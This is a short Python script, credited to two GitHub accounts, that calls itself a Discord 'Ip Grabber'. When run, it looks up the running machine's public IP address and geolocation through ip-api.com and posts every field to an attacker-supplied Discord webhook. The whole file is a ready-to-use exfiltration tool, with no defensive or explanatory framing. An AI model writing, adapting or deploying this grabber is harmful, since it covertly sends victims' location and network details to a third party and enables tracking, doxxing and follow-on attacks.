import requests, json

webhook = 'Webhook URL Here'

msg = "```New Ip Are Grabbed\n\n"
for item, data in (requests.get('http://ip-api.com/json/')).json().items():
    msg += f"{item}: {data}\n"

msg += "\nIp Grabber By github.com/XinOnGithub + github.com/Monst3red```"
requests.post(webhook, data={"content":f'{msg}',"username":"Discord Ip Grabber"})